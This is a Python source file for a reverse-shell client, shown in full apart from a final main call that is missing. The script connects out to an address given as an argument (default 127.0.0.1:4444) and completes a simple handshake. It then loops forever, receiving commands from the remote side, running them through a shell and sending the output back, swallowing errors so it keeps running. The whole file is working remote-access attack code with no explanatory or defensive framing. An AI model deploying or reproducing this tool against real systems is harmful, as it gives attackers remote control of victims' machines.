#!/usr/bin/python3

from subprocess import Popen, PIPE
import socket
import os
from sys import argv

def run_cmd(cmd):
	if " " in cmd and cmd.split(" ")[0] == "cd":
		try:
			os.chdir(cmd.split(" ")[1])
			return "newdir: " + cmd.split(" ")[1]
		except:
			return "error"
	else:
		try:
			return Popen(cmd,stdout=PIPE,shell=True).communicate()[0].decode()
		except Exception as e:
			return "error: "+str(e)

def client_init(ip,port):
	c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	c.connect((ip,port))
	hs = c.recv(1024).decode()
	if hs == "CLIENT?":
		c.send("YEAH.".encode())
		return c
	return False

def client_loop(conn):
	while True:
		try:
			conn.send("cmd?".encode())
			cmd = conn.recv(4096).decode()
			res = run_cmd(cmd)
			conn.send((res+"#done#").encode())
		except: pass

def main(argv=argv):
	try:
		addr = argv[1].split(":")
		ip = addr[0]
		port = int(addr[1])
	except:
		ip = "127.0.0.1"
		port = 4444
	conn = client_init(ip,port)
	client_loop(conn)

if __name__ == "__main__":
